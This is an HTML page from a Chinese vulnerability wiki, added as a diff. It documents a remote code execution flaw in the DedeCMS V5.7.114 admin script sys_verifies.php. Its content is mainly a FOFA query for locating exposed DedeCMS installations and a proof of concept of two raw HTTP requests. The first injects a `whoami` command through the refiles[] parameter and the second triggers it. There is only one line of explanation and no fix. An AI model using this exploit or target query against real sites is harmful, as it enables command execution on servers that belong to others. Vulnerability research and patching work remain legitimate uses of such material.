@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/dede/DedeCMSV5.7.114%E5%90%8E%E5%8F%B0sys_verizes.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>DedeCMSV5.7.114后台sys_verizes.php存在远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "DedeCMSV5.7.114\u540e\u53f0sys_verizes.php\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Dedecms%20v5.7.111%E5%89%8D%E5%8F%B0tags.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Dedecms%20v5.7.111%E5%89%8D%E5%8F%B0tags.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Dedecms v5.7.111前台tags.php SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../DedeCMSV5.7.114%E5%90%8E%E5%8F%B0article_template_rand.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../DedeCMSV5.7.114%E5%90%8E%E5%8F%B0article_template_rand.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        DedeCMSV5.7.114后台article_template_rand.php存在远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="dedecmsv57114sys_verizesphp">DedeCMSV5.7.114后台sys_verizes.php存在远程代码执行漏洞<a class="headerlink" href="#dedecmsv57114sys_verizesphp" title="Permanent link">&para;</a></h1>
+<p>DedeCMS V5.7.114存在远程代码执行漏洞。产生该漏洞的原因是，虽然sys_verizes.php对编辑的文件进行了一定的限制，但攻击者仍然可以绕过这些限制并以某种方式编写代码，从而允许经过身份验证的攻击者利用该漏洞执行任意命令并获得系统权限。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">app=&quot;DedeCMS网站内容管理系统&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">GET /dede/sys_verifies.php?action=getfiles&amp;refiles[]=123${${print%20`whoami`}} HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">127.0.0.11</span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span>
+<span class="nt">Accept</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="nt">Accept-Language</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip, deflate, br</span>
+<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">close</span>
+<span class="nt">Cookie</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; PHPSESSID=89s6bbv2d1unokav5grt4bk2g4; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=10acd9938ef3615d; DedeLoginTime=1720327720; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=c5e6c12f26661f56; _csrf_name_236f0c58=6d608f0ee0d0e0b59410565dfeec6b2b; _csrf_name_236f0c581BH21ANI1AGD297L1FF21LN02BGE1DNG=bc5881b7b91f1bd9</span>
+<span class="nt">Upgrade-Insecure-Requests</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">Sec-Fetch-Dest</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">document</span>
+<span class="nt">Sec-Fetch-Mode</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">navigate</span>
+<span class="nt">Sec-Fetch-Site</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">none</span>
+<span class="nt">Sec-Fetch-User</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">?1</span>
+<span class="nt">Priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">u=1</span>
+</code></pre></div>
+<p><img alt="2024712-6" src="https://gitee.com/fushuling/cve/raw/master/2024712-6.png" /></p>
+<div class="highlight"><pre><span></span><code>GET /dede/sys_verifies.php?action=down&amp;curfile=1 HTTP/1.1
+Host: 127.0.0.11
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; PHPSESSID=89s6bbv2d1unokav5grt4bk2g4; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=10acd9938ef3615d; DedeLoginTime=1720327720; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=c5e6c12f26661f56; _csrf_name_236f0c58=6d608f0ee0d0e0b59410565dfeec6b2b; _csrf_name_236f0c581BH21ANI1AGD297L1FF21LN02BGE1DNG=bc5881b7b91f1bd9
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=1
+</code></pre></div>
+<p><img alt="20224712-8" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191227418.png" /></p>
+<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><img alt="" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191227658.png" /></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Dedecms%20v5.7.111%E5%89%8D%E5%8F%B0tags.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Dedecms%20v5.7.111%E5%89%8D%E5%8F%B0tags.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Dedecms v5.7.111前台tags.php SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../DedeCMSV5.7.114%E5%90%8E%E5%8F%B0article_template_rand.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../DedeCMSV5.7.114%E5%90%8E%E5%8F%B0article_template_rand.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        DedeCMSV5.7.114后台article_template_rand.php存在远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
